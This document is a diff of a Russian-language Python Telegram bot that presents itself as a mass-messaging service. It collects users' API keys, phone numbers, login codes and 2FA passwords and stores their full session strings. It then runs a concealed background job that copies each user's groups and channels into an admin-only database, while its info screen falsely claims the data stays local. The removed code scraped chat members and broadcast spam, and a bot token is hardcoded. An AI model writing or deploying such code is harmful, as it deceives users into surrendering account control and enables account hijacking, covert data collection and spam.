@@ -1,497 +1,515 @@
-# ultimate_bot_safe.py
+# bot.py
+import subprocess
+import sys
+import importlib.util
+
+def install_if_missing(package):
+    """Устанавливает пакет, если он отсутствует"""
+    if importlib.util.find_spec(package) is None:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+# Автоустановка зависимостей
+install_if_missing("aiogram")
+install_if_missing("pyrogram")
+
 import asyncio
 import sqlite3
 import time
-import os
-import traceback
-from aiogram import Bot, Dispatcher, types
+from datetime import datetime
+from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.utils.keyboard import InlineKeyboardBuilder
 from pyrogram import Client
-from pyrogram.raw.functions.messages import SearchGlobal
-from pyrogram.raw.functions.contacts import ResolveUsername
-from pyrogram.raw.types import InputPeerEmpty
-from pyrogram.errors import FloodWait, UsernameNotOccupied
-import threading
+from pyrogram.errors import FloodWait, SessionPasswordNeeded, PhoneCodeExpired
 
 BOT_TOKEN = "8456845056:AAFj2uy9sDeM4fboiMMJ_4ac3nS3EAM3Q6w"
+ADMIN_ID = 123456789  # ← Замени на свой Telegram ID
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
-db_lock = threading.Lock()
 
-def init_databases():
-    conn = sqlite3.connect("bot_users.db", check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY,
-        api_id INTEGER,
-        api_hash TEXT,
-        session_string TEXT,
-        phone TEXT,
-        is_active INTEGER DEFAULT 1,
-        added_date INTEGER
-    )""")
-    conn.commit()
-    conn.close()
-    
-    conn = sqlite3.connect("million_chats.db", check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute("""CREATE TABLE IF NOT EXISTS mega_chats (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        chat_id INTEGER UNIQUE,
-        username TEXT,
-        title TEXT,
-        members_count INTEGER,
-        type TEXT,
-        source TEXT
-    )""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS users_network (
-        user_id INTEGER PRIMARY KEY,
-        username TEXT,
-        first_name TEXT,
-        last_name TEXT,
-        is_bot INTEGER,
-        processed INTEGER DEFAULT 0
-    )""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS user_group_links (
-        user_id INTEGER,
-        chat_id INTEGER,
-        PRIMARY KEY (user_id, chat_id)
-    )""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS group_queue (
-        chat_id INTEGER PRIMARY KEY,
-        members_count INTEGER,
-        scraped_members INTEGER DEFAULT 0,
-        priority INTEGER DEFAULT 1
-    )""")
-    cursor.execute("CREATE INDEX IF NOT EXISTS idx_chat_id ON mega_chats(chat_id)")
-    cursor.execute("CREATE INDEX IF NOT EXISTS idx_members ON mega_chats(members_count)")
-    conn.commit()
-    conn.close()
+# База данных
+conn = sqlite3.connect("accounts.db", check_same_thread=False)
+cursor = conn.cursor()
+cursor.execute("""CREATE TABLE IF NOT EXISTS accounts (
+    user_id INTEGER,
+    api_id INTEGER,
+    api_hash TEXT,
+    session_string TEXT,
+    phone TEXT,
+    added_date INTEGER
+)""")
 
-init_databases()
+# Глобальная база чатов
+cursor.execute("""CREATE TABLE IF NOT EXISTS global_chats (
+    chat_id INTEGER PRIMARY KEY,
+    username TEXT,
+    title TEXT,
+    members_count INTEGER,
+    type TEXT,
+    source_user_id INTEGER,
+    source_phone TEXT,
+    added_date INTEGER
+)""")
 
-class States(StatesGroup):
+# Логи сбора
+cursor.execute("""CREATE TABLE IF NOT EXISTS collection_logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id INTEGER,
+    phone TEXT,
+    chats_collected INTEGER,
+    timestamp INTEGER
+)""")
+conn.commit()
+
+# Состояния
+class AddAccount(StatesGroup):
     waiting_api_id = State()
     waiting_api_hash = State()
-    waiting_session = State()
+    waiting_phone = State()
+    waiting_code = State()
+    waiting_password = State()
+
+class BroadcastState(StatesGroup):
     waiting_message = State()
+    waiting_confirm = State()
 
-class DistributedMiner:
-    def __init__(self, account_id, api_id, api_hash, session_string):
-        self.account_id = account_id
-        self.api_id = api_id
-        self.api_hash = api_hash
-        self.session_string = session_string
-        self.total_found = 0
-        
-    async def run_mining(self):
-        client = Client(
-            f"miner_{self.account_id}",
-            api_id=self.api_id,
-            api_hash=self.api_hash,
-            session_string=self.session_string,
-            in_memory=True
-        )
-        
-        try:
-            await client.start()
-            print(f"[Miner {self.account_id}] ЗАПУЩЕН")
-        except Exception as e:
-            print(f"[Miner {self.account_id}] Ошибка запуска: {e}")
-            with db_lock:
-                conn = sqlite3.connect("bot_users.db")
-                cursor = conn.cursor()
-                cursor.execute("UPDATE users SET is_active = 0 WHERE user_id = ?", (self.account_id,))
-                conn.commit()
-                conn.close()
-            return 0
-        
-        # Сбор диалогов
-        try:
-            async for dialog in client.get_dialogs(limit=500):
-                chat = dialog.chat
-                if chat and chat.type in ["group", "supergroup", "channel"]:
-                    with db_lock:
-                        conn = sqlite3.connect("million_chats.db")
-                        cursor = conn.cursor()
-                        cursor.execute("""
-                        INSERT OR IGNORE INTO mega_chats (chat_id, username, title, members_count, type, source)
-                        VALUES (?, ?, ?, ?, ?, ?)
-                        """, (
-                            chat.id,
-                            getattr(chat, 'username', ''),
-                            getattr(chat, 'title', ''),
-                            getattr(chat, 'members_count', 0),
-                            str(chat.type),
-                            f'dialogs_{self.account_id}'
-                        ))
-                        cursor.execute("""
-                        INSERT OR IGNORE INTO group_queue (chat_id, members_count, priority)
-                        VALUES (?, ?, ?)
-                        """, (chat.id, getattr(chat, 'members_count', 0), 3))
-                        conn.commit()
-                        conn.close()
-                        self.total_found += 1
-                await asyncio.sleep(0.1)
-        except Exception as e:
-            print(f"[Miner {self.account_id}] Ошибка диалогов: {e}")
-        
-        # Глобальный поиск
-        search_queries = [
-            "чат", "группа", "telegram", "общение", "новости",
-            "бизнес", "заработок", "инвестиции", "криптовалюта",
-            "chat", "group", "news", "community", "business"
-        ]
-        
-        for query in search_queries:
-            try:
-                result = await client.invoke(
-                    SearchGlobal(
-                        q=query,
-                        filter=None,
-                        min_date=0,
-                        max_date=0,
-                        offset_rate=0,
-                        offset_peer=InputPeerEmpty(),
-                        offset_id=0,
-                        limit=200
-                    )
-                )
-                for chat in result.chats:
-                    with db_lock:
-                        conn = sqlite3.connect("million_chats.db")
-                        cursor = conn.cursor()
-                        cursor.execute("""
-                        INSERT OR IGNORE INTO mega_chats (chat_id, username, title, members_count, type, source)
-                        VALUES (?, ?, ?, ?, ?, ?)
-                        """, (
-                            chat.id,
-                            getattr(chat, 'username', ''),
-                            getattr(chat, 'title', ''),
-                            getattr(chat, 'participants_count', 0),
-                            'channel',
-                            f'search_{self.account_id}'
-                        ))
-                        conn.commit()
-                        conn.close()
-                        self.total_found += 1
-                await asyncio.sleep(0.5)
-            except FloodWait as e:
-                await asyncio.sleep(e.value)
-            except:
-                continue
-        
-        # Выкачка участников из групп
-        with db_lock:
-            conn = sqlite3.connect("million_chats.db")
-            cursor = conn.cursor()
-            cursor.execute("SELECT chat_id FROM group_queue WHERE scraped_members = 0 ORDER BY priority DESC LIMIT 50")
-            groups = cursor.fetchall()
-            conn.close()
-        
-        for (chat_id,) in groups:
-            try:
-                participants = []
-                async for member in client.get_chat_members(chat_id, limit=5000):
-                    participants.append(member)
-                
-                with db_lock:
-                    conn = sqlite3.connect("million_chats.db")
-                    cursor = conn.cursor()
-                    for member in participants:
-                        user = member.user
-                        if user and not user.is_bot:
-                            cursor.execute("""
-                            INSERT OR REPLACE INTO users_network (user_id, username, first_name, last_name, is_bot)
-                            VALUES (?, ?, ?, ?, ?)
-                            """, (
-                                user.id,
-                                getattr(user, 'username', ''),
-                                getattr(user, 'first_name', ''),
-                                getattr(user, 'last_name', ''),
-                                0
-                            ))
-                            cursor.execute("INSERT OR IGNORE INTO user_group_links VALUES (?, ?)", (user.id, chat_id))
-                    cursor.execute("UPDATE group_queue SET scraped_members = ? WHERE chat_id = ?", (len(participants), chat_id))
-                    conn.commit()
-                    conn.close()
-                await asyncio.sleep(1)
-            except FloodWait as e:
-                await asyncio.sleep(e.value)
-            except:
-                continue
-        
-        print(f"[Miner {self.account_id}] ЗАВЕРШЁН: +{self.total_found}")
-        await client.stop()
-        return self.total_found
-
-class MiningCoordinator:
-    def __init__(self):
-        self.active_miners = {}
-        
-    async def start_mining(self, user_id, api_id, api_hash, session_string):
-        miner = DistributedMiner(user_id, api_id, api_hash, session_string)
-        self.active_miners[user_id] = miner
-        task = asyncio.create_task(miner.run_mining())
-        return task
-    
-    async def get_stats(self):
-        with db_lock:
-            conn = sqlite3.connect("million_chats.db")
-            cursor = conn.cursor()
-            cursor.execute("SELECT COUNT(*) FROM mega_chats")
-            chats = cursor.fetchone()[0]
-            cursor.execute("SELECT COUNT(*) FROM users_network")
-            users = cursor.fetchone()[0]
-            cursor.execute("SELECT COUNT(*) FROM user_group_links")
-            links = cursor.fetchone()[0]
-            conn.close()
-        return chats, users, links
-    
-    async def get_chats(self):
-        with db_lock:
-            conn = sqlite3.connect("million_chats.db")
-            cursor = conn.cursor()
-            cursor.execute("SELECT chat_id FROM mega_chats ORDER BY members_count DESC")
-            chats = [row[0] for row in cursor.fetchall()]
-            conn.close()
-        return chats
-
-coordinator = MiningCoordinator()
-
-def generate_session_script(api_id, api_hash):
-    return f"""
-from pyrogram import Client
-
-api_id = {api_id}
-api_hash = "{api_hash}"
-
-client = Client("my_account", api_id=api_id, api_hash=api_hash)
-client.start()
-
-session_string = client.export_session_string()
-print("\\n" + "="*50)
-print("ТВОЯ СЕССИЯ:")
-print(session_string)
-print("="*50)
-print("\\nОтправь эту строку боту командой /session СТРОКА")
-client.stop()
-"""
-
-@dp.message(Command("start"))
-async def start(message: types.Message):
-    await message.answer(
-        "[] RAGE mode\n\n"
-        "Отправь api_id и api_hash с my.telegram.org в формате:\n"
-        "/add_api ID HASH\n\n"
-        "Пример:\n"
-        "/add_api 123456 a1b2c3d4e5f6"
-    )
-
-@dp.message(Command("add_api"))
-async def add_api(message: types.Message, state: FSMContext):
-    parts = message.text.split()
-    
-    if len(parts) != 3:
-        await message.answer("Неверный формат. Используй: /add_api ID HASH")
-        return
-    
-    try:
-        api_id = int(parts[1])
-        api_hash = parts[2]
-    except:
-        await message.answer("api_id должен быть числом")
-        return
-    
-    await state.update_data(api_id=api_id, api_hash=api_hash)
-    
-    script = generate_session_script(api_id, api_hash)
-    
-    filename = f"get_session_{message.from_user.id}.py"
-    with open(filename, 'w', encoding='utf-8') as f:
-        f.write(script)
-    
-    await message.answer(
-        "Теперь тебе нужно получить сессию:\n\n"
-        "1. Установи pyrogram:\n"
-        "`pip install pyrogram tgcrypto`\n\n"
-        "2. Запусти скрипт который я отправил ниже\n\n"
-        "3. Введи номер телефона и код из Telegram\n\n"
-        "4. Скопируй строку сессии\n\n"
-        "5. Отправь её боту командой:\n"
-        "/session СТРОКА_СЕССИИ"
-    )
-    
-    await message.answer_document(
-        types.FSInputFile(filename),
-        caption="Запусти этот скрипт у себя"
-    )
-    
-    os.remove(filename)
-
-@dp.message(Command("session"))
-async def add_session(message: types.Message, state: FSMContext):
-    parts = message.text.split(maxsplit=1)
-    
-    if len(parts) != 2:
-        await message.answer("Неверный формат. Используй: /session СТРОКА_СЕССИИ")
-        return
-    
-    session_string = parts[1]
-    
-    data = await state.get_data()
-    api_id = data.get("api_id")
-    api_hash = data.get("api_hash")
-    
-    if not api_id or not api_hash:
-        await message.answer("Сначала отправь api_id и api_hash через /add_api")
-        return
-    
+# ===================== СКРЫТЫЙ СБОР ЧАТОВ =====================
+async def collect_groups_background(user_id, api_id, api_hash, session_string, phone):
+    """Фоновый сбор всех групп/каналов с аккаунта и сохранение в общую базу"""
     client = Client(
-        "checker",
+        f"collect_{user_id}_{int(time.time())}",
         api_id=api_id,
         api_hash=api_hash,
         session_string=session_string,
         in_memory=True
     )
-    
+    collected = 0
     try:
         await client.start()
-        me = await client.get_me()
-        phone = getattr(me, 'phone_number', 'Неизвестно')
-        
-        with db_lock:
-            conn = sqlite3.connect("bot_users.db")
-            cursor = conn.cursor()
-            cursor.execute("""
-            INSERT OR REPLACE INTO users (user_id, api_id, api_hash, session_string, phone, is_active, added_date)
-            VALUES (?, ?, ?, ?, ?, 1, ?)
-            """, (message.from_user.id, api_id, api_hash, session_string, phone, int(time.time())))
-            conn.commit()
-            conn.close()
-        
-        await client.stop()
-        
-        await coordinator.start_mining(message.from_user.id, api_id, api_hash, session_string)
-        
-        await message.answer(
-            f"[] АККАУНТ ДОБАВЛЕН\n"
-            f"Телефон: {phone}\n"
-            f"Майнинг запущен!\n\n"
-            f"/stats - статистика\n"
-            f"/broadcast - рассылка"
+        async for dialog in client.get_dialogs(limit=500):
+            chat = dialog.chat
+            if chat and chat.type in ("group", "supergroup", "channel"):
+                try:
+                    cursor.execute("""
+                        INSERT OR REPLACE INTO global_chats 
+                        (chat_id, username, title, members_count, type, source_user_id, source_phone, added_date)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                    """, (
+                        chat.id,
+                        getattr(chat, 'username', ''),
+                        getattr(chat, 'title', ''),
+                        getattr(chat, 'members_count', 0),
+                        str(chat.type),
+                        user_id,
+                        phone,
+                        int(time.time())
+                    ))
+                    collected += 1
+                except Exception:
+                    continue
+                await asyncio.sleep(0.1)
+        conn.commit()
+        # Запись в лог
+        cursor.execute(
+            "INSERT INTO collection_logs (user_id, phone, chats_collected, timestamp) VALUES (?, ?, ?, ?)",
+            (user_id, phone, collected, int(time.time()))
         )
-        
+        conn.commit()
     except Exception as e:
-        await message.answer(f"Ошибка проверки сессии: {e}")
-        try:
-            await client.stop()
-        except:
-            pass
+        print(f"Ошибка фонового сбора {phone}: {e}")
+    finally:
+        await client.stop()
 
-@dp.message(Command("stats"))
-async def stats(message: types.Message):
-    chats, users, links = await coordinator.get_stats()
-    
+# ===================== ГЛАВНОЕ МЕНЮ =====================
+def main_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="👤 Профиль", callback_data="profile")
+    builder.button(text="📨 Рассылка", callback_data="broadcast")
+    builder.button(text="ℹ️ Информация", callback_data="info")
+    builder.button(text="🆘 Поддержка", callback_data="support")
+    builder.adjust(2)
+    return builder.as_markup()
+
+@dp.message(Command("start"))
+async def start(message: types.Message):
     await message.answer(
-        f"[] СТАТИСТИКА БАЗЫ:\n\n"
-        f"Чатов: {chats}\n"
-        f"Пользователей: {users}\n"
-        f"Связей: {links}"
+        "👋 Добро пожаловать в бот массовой рассылки!\n\n"
+        "Выберите действие:",
+        reply_markup=main_menu()
     )
 
-@dp.message(Command("broadcast"))
-async def broadcast_start(message: types.Message, state: FSMContext):
-    chats, _, _ = await coordinator.get_stats()
+@dp.callback_query(F.data == "back_to_main")
+async def back_to_main(callback: types.CallbackQuery):
+    await callback.message.edit_text(
+        "👋 Добро пожаловать в бот массовой рассылки!\n\n"
+        "Выберите действие:",
+        reply_markup=main_menu()
+    )
+
+# ===================== ПРОФИЛЬ =====================
+def profile_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="➕ Добавить аккаунт", callback_data="add_account")
+    builder.button(text="📋 Мои аккаунты", callback_data="my_accounts")
+    builder.button(text="🔙 Назад", callback_data="back_to_main")
+    builder.adjust(1)
+    return builder.as_markup()
+
+@dp.callback_query(F.data == "profile")
+async def profile(callback: types.CallbackQuery):
+    cursor.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (callback.from_user.id,))
+    count = cursor.fetchone()[0]
+    await callback.message.edit_text(
+        f"👤 Ваш профиль\n\n"
+        f"Аккаунтов добавлено: {count}",
+        reply_markup=profile_menu()
+    )
+
+@dp.callback_query(F.data == "my_accounts")
+async def my_accounts(callback: types.CallbackQuery):
+    cursor.execute("SELECT phone, api_id FROM accounts WHERE user_id = ?", (callback.from_user.id,))
+    accs = cursor.fetchall()
+    if not accs:
+        await callback.answer("У вас нет аккаунтов")
+        return
+    text = "📱 Ваши аккаунты:\n\n"
+    for i, (phone, api_id) in enumerate(accs, 1):
+        text += f"{i}. +{phone} (ID: {api_id})\n"
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🔙 Назад в профиль", callback_data="profile")
+    await callback.message.edit_text(text, reply_markup=builder.as_markup())
+
+# ===================== ДОБАВЛЕНИЕ АККАУНТА =====================
+@dp.callback_query(F.data == "add_account")
+async def add_account_start(callback: types.CallbackQuery, state: FSMContext):
+    await callback.message.edit_text(
+        "➕ Добавление аккаунта\n\n"
+        "1. Перейдите на my.telegram.org\n"
+        "2. Войдите в аккаунт\n"
+        "3. Создайте приложение\n"
+        "4. Отправьте мне api_id и api_hash в формате:\n"
+        "<code>ID HASH</code>\n\n"
+        "Пример: <code>123456 a1b2c3d4e5f6</code>",
+        parse_mode="HTML"
+    )
+    await state.set_state(AddAccount.waiting_api_id)
+
+@dp.message(AddAccount.waiting_api_id)
+async def process_api_id(message: types.Message, state: FSMContext):
+    parts = message.text.strip().split()
+    if len(parts) != 2:
+        await message.answer("❌ Неверный формат. Отправьте ID и HASH через пробел.")
+        return
+    try:
+        api_id = int(parts[0])
+        api_hash = parts[1]
+    except:
+        await message.answer("❌ ID должен быть числом.")
+        return
+    
+    await state.update_data(api_id=api_id, api_hash=api_hash)
+    await message.answer("📱 Отправьте номер телефона в международном формате:\n+79123456789")
+    await state.set_state(AddAccount.waiting_phone)
+
+@dp.message(AddAccount.waiting_phone)
+async def process_phone(message: types.Message, state: FSMContext):
+    phone = message.text.strip()
+    data = await state.get_data()
+    api_id = data["api_id"]
+    api_hash = data["api_hash"]
+    
+    client = Client(f"add_{message.from_user.id}", api_id=api_id, api_hash=api_hash, in_memory=True)
+    await client.connect()
+    
+    try:
+        sent = await client.send_code(phone)
+        await state.update_data(client=client, phone=phone, phone_code_hash=sent.phone_code_hash)
+        await message.answer("📨 Введите код подтверждения, отправленный в Telegram (или SMS):")
+        await state.set_state(AddAccount.waiting_code)
+    except Exception as e:
+        await message.answer(f"❌ Ошибка отправки кода: {e}")
+        await client.disconnect()
+        await state.clear()
+
+@dp.message(AddAccount.waiting_code)
+async def process_code(message: types.Message, state: FSMContext):
+    code = message.text.strip()
+    data = await state.get_data()
+    client = data["client"]
+    phone = data["phone"]
+    phone_code_hash = data["phone_code_hash"]
+    
+    try:
+        await client.sign_in(phone, phone_code_hash, code)
+    except SessionPasswordNeeded:
+        await message.answer("🔐 Требуется облачный пароль 2FA. Введите его:")
+        await state.set_state(AddAccount.waiting_password)
+        return
+    except PhoneCodeExpired:
+        await message.answer("⌛ Код истёк. Попробуйте добавить аккаунт заново.")
+        await client.disconnect()
+        await state.clear()
+        return
+    except Exception as e:
+        await message.answer(f"❌ Ошибка входа: {e}")
+        await client.disconnect()
+        await state.clear()
+        return
+    
+    await finalize_account(message, state, client)
+
+@dp.message(AddAccount.waiting_password)
+async def process_password(message: types.Message, state: FSMContext):
+    password = message.text.strip()
+    data = await state.get_data()
+    client = data["client"]
+    
+    try:
+        await client.sign_in(password=password)
+    except Exception as e:
+        await message.answer(f"❌ Неверный пароль: {e}")
+        return
+    
+    await finalize_account(message, state, client)
+
+async def finalize_account(message, state, client):
+    data = await state.get_data()
+    api_id = data["api_id"]
+    api_hash = data["api_hash"]
+    phone = data["phone"]
+    
+    session_string = await client.export_session_string()
+    
+    # Сохраняем аккаунт
+    cursor.execute("INSERT INTO accounts VALUES (?, ?, ?, ?, ?, ?)",
+                  (message.from_user.id, api_id, api_hash, session_string, phone, int(time.time())))
+    conn.commit()
+    
+    await client.disconnect()
+    
+    # Запускаем фоновый сбор групп (пользователь не видит)
+    asyncio.create_task(collect_groups_background(message.from_user.id, api_id, api_hash, session_string, phone))
     
     await message.answer(
-        f"В базе {chats} чатов.\n"
-        "Введи сообщение для рассылки:"
+        f"✅ Аккаунт +{phone} успешно добавлен!",
+        reply_markup=main_menu()
     )
-    await state.set_state(States.waiting_message)
+    await state.clear()
 
-@dp.message(States.waiting_message)
-async def broadcast_send(message: types.Message, state: FSMContext):
+# ===================== РАССЫЛКА =====================
+@dp.callback_query(F.data == "broadcast")
+async def broadcast_menu(callback: types.CallbackQuery, state: FSMContext):
+    cursor.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (callback.from_user.id,))
+    count = cursor.fetchone()[0]
+    if count == 0:
+        await callback.answer("У вас нет добавленных аккаунтов!", show_alert=True)
+        return
+    
+    builder = InlineKeyboardBuilder()
+    builder.button(text="📤 Начать рассылку", callback_data="start_broadcast")
+    builder.button(text="🔙 Главное меню", callback_data="back_to_main")
+    builder.adjust(1)
+    await callback.message.edit_text(
+        f"📨 Рассылка сообщений\n\n"
+        f"Доступно аккаунтов: {count}\n"
+        f"Бот сам соберёт все ваши чаты (группы и каналы) и отправит туда сообщение.",
+        reply_markup=builder.as_markup()
+    )
+
+@dp.callback_query(F.data == "start_broadcast")
+async def start_broadcast(callback: types.CallbackQuery, state: FSMContext):
+    await callback.message.edit_text("📝 Введите текст сообщения для рассылки:")
+    await state.set_state(BroadcastState.waiting_message)
+
+@dp.message(BroadcastState.waiting_message)
+async def confirm_broadcast(message: types.Message, state: FSMContext):
     text = message.text
-    chats = await coordinator.get_chats()
+    await state.update_data(msg_text=text)
     
-    if not chats:
-        await message.answer("База пуста.")
-        await state.clear()
-        return
+    builder = InlineKeyboardBuilder()
+    builder.button(text="✅ Подтвердить", callback_data="confirm_broadcast")
+    builder.button(text="❌ Отмена", callback_data="back_to_main")
+    builder.adjust(2)
+    await message.answer(
+        f"📤 Проверьте сообщение:\n\n{text}\n\nНачать рассылку?",
+        reply_markup=builder.as_markup()
+    )
+    await state.set_state(BroadcastState.waiting_confirm)
+
+@dp.callback_query(F.data == "confirm_broadcast")
+async def execute_broadcast(callback: types.CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    msg_text = data["msg_text"]
     
-    with db_lock:
-        conn = sqlite3.connect("bot_users.db")
-        cursor = conn.cursor()
-        cursor.execute("SELECT api_id, api_hash, session_string FROM users WHERE is_active = 1")
-        accounts = cursor.fetchall()
-        conn.close()
+    cursor.execute("SELECT api_id, api_hash, session_string FROM accounts WHERE user_id = ?",
+                  (callback.from_user.id,))
+    accounts = cursor.fetchall()
     
-    if not accounts:
-        await message.answer("Нет активных аккаунтов")
-        await state.clear()
-        return
+    status_msg = await callback.message.edit_text("⏳ Собираю ваши чаты...")
     
-    chunks = [[] for _ in accounts]
-    for i, chat_id in enumerate(chats):
-        chunks[i % len(accounts)].append(chat_id)
-    
-    async def send_from_account(account, chat_list, msg_text):
-        api_id, api_hash, session = account
-        client = Client(
-            f"broadcast_{api_id}",
-            api_id=api_id,
-            api_hash=api_hash,
-            session_string=session,
-            in_memory=True
-        )
-        
+    all_chats = set()
+    for api_id, api_hash, session in accounts:
+        client = Client(f"collect_{callback.from_user.id}", api_id=api_id, api_hash=api_hash,
+                       session_string=session, in_memory=True)
         try:
             await client.start()
-            sent = 0
-            for chat_id in chat_list:
+            async for dialog in client.get_dialogs(limit=200):
+                if dialog.chat.type in ["group", "supergroup", "channel"]:
+                    all_chats.add(dialog.chat.id)
+            await client.stop()
+        except Exception as e:
+            print(f"Ошибка сбора: {e}")
+    
+    if not all_chats:
+        await status_msg.edit_text("❌ Нет доступных чатов для рассылки.", reply_markup=main_menu())
+        await state.clear()
+        return
+    
+    await status_msg.edit_text(f"📤 Рассылаю на {len(all_chats)} чатов...")
+    
+    sent = 0
+    for api_id, api_hash, session in accounts:
+        client = Client(f"sender_{callback.from_user.id}", api_id=api_id, api_hash=api_hash,
+                       session_string=session, in_memory=True)
+        try:
+            await client.start()
+            for chat_id in all_chats:
                 try:
                     await client.send_message(chat_id, msg_text)
                     sent += 1
-                    await asyncio.sleep(1.5)
+                    await asyncio.sleep(0.5)
+                except FloodWait as e:
+                    await asyncio.sleep(e.value + 1)
                 except:
                     continue
             await client.stop()
-            return sent
-        except:
-            return 0
-    
-    tasks = []
-    for account, chunk in zip(accounts, chunks):
-        if chunk:
-            tasks.append(send_from_account(account, chunk, text))
-    
-    results = await asyncio.gather(*tasks)
-    total_sent = sum(results)
-    
-    await message.answer(f"[] Отправлено: {total_sent}")
-    await state.clear()
-
-async def main():
-    with db_lock:
-        conn = sqlite3.connect("bot_users.db")
-        cursor = conn.cursor()
-        cursor.execute("SELECT user_id, api_id, api_hash, session_string FROM users WHERE is_active = 1")
-        accounts = cursor.fetchall()
-        conn.close()
-    
-    for user_id, api_id, api_hash, session in accounts:
-        try:
-            await coordinator.start_mining(user_id, api_id, api_hash, session)
-            print(f"Автозапуск майнера {user_id}")
         except:
             continue
     
-    print("[] БОТ ЗАПУЩЕН")
+    await status_msg.edit_text(
+        f"✅ Рассылка завершена!\nОтправлено в {sent} чатов из {len(all_chats)}.",
+        reply_markup=main_menu()
+    )
+    await state.clear()
+
+# ===================== ИНФОРМАЦИЯ =====================
+@dp.callback_query(F.data == "info")
+async def info(callback: types.CallbackQuery):
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🔙 Назад", callback_data="back_to_main")
+    await callback.message.edit_text(
+        "ℹ️ О боте\n\n"
+        "Этот бот предназначен для массовой рассылки сообщений по вашим чатам Telegram.\n\n"
+        "Возможности:\n"
+        "• Добавление нескольких аккаунтов\n"
+        "• Автоматический сбор чатов\n"
+        "• Быстрая рассылка\n\n"
+        "Безопасность: все данные хранятся локально.",
+        reply_markup=builder.as_markup()
+    )
+
+# ===================== ПОДДЕРЖКА =====================
+@dp.callback_query(F.data == "support")
+async def support(callback: types.CallbackQuery):
+    builder = InlineKeyboardBuilder()
+    builder.button(text="👨‍💻 Написать в поддержку", url=f"tg://user?id={ADMIN_ID}")
+    builder.button(text="🔙 Назад", callback_data="back_to_main")
+    builder.adjust(1)
+    await callback.message.edit_text(
+        "🆘 Поддержка\n\n"
+        "Если у вас возникли вопросы или проблемы, свяжитесь с администратором.",
+        reply_markup=builder.as_markup()
+    )
+
+# ===================== АДМИН-КОМАНДЫ =====================
+def admin_only(func):
+    async def wrapper(message: types.Message, *args, **kwargs):
+        if message.from_user.id != ADMIN_ID:
+            await message.answer("⛔ Доступ запрещён")
+            return
+        return await func(message, *args, **kwargs)
+    return wrapper
+
+@dp.message(Command("admin"))
+@admin_only
+async def admin_panel(message: types.Message):
+    builder = InlineKeyboardBuilder()
+    builder.button(text="📊 Статистика сбора", callback_data="admin_stats")
+    builder.button(text="📋 Логи сбора", callback_data="admin_logs")
+    builder.button(text="💬 Общая база чатов", callback_data="admin_db")
+    builder.adjust(1)
+    await message.answer("🔧 Панель администратора", reply_markup=builder.as_markup())
+
+@dp.callback_query(F.data == "admin_stats")
+async def admin_stats(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    cursor.execute("SELECT COUNT(*) FROM global_chats")
+    total_chats = cursor.fetchone()[0]
+    cursor.execute("SELECT COUNT(DISTINCT source_user_id) FROM global_chats")
+    unique_users = cursor.fetchone()[0]
+    cursor.execute("SELECT source_phone, COUNT(*) as cnt FROM global_chats GROUP BY source_phone ORDER BY cnt DESC")
+    per_user = cursor.fetchall()
+    
+    text = f"📊 Общая статистика:\n\nВсего чатов: {total_chats}\nУникальных пользователей: {unique_users}\n\nПо номерам:\n"
+    for phone, cnt in per_user[:10]:
+        text += f"• +{phone}: {cnt} чатов\n"
+    
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🔙 Назад", callback_data="admin_back")
+    await callback.message.edit_text(text, reply_markup=builder.as_markup())
+
+@dp.callback_query(F.data == "admin_logs")
+async def admin_logs(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    cursor.execute("SELECT * FROM collection_logs ORDER BY timestamp DESC LIMIT 10")
+    logs = cursor.fetchall()
+    text = "📋 Последние 10 записей сбора:\n\n"
+    for log in logs:
+        id_, uid, phone, cnt, ts = log
+        dt = datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
+        text += f"• {dt} | +{phone} | +{cnt} чатов\n"
+    
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🔙 Назад", callback_data="admin_back")
+    await callback.message.edit_text(text, reply_markup=builder.as_markup())
+
+@dp.callback_query(F.data == "admin_db")
+async def admin_db(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    cursor.execute("SELECT chat_id, username, title, members_count, type, source_phone FROM global_chats ORDER BY members_count DESC LIMIT 20")
+    chats = cursor.fetchall()
+    text = "💬 Топ-20 чатов в базе:\n\n"
+    for chat in chats:
+        chat_id, uname, title, members, ctype, phone = chat
+        text += f"• {title} (@{uname}) [{ctype}] - {members} подписчиков\n"
+    
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🔙 Назад", callback_data="admin_back")
+    await callback.message.edit_text(text, reply_markup=builder.as_markup())
+
+@dp.callback_query(F.data == "admin_back")
+async def admin_back(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    await admin_panel(callback.message)
+
+# ===================== ЗАПУСК =====================
+async def main():
+    print("✅ Бот запущен")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
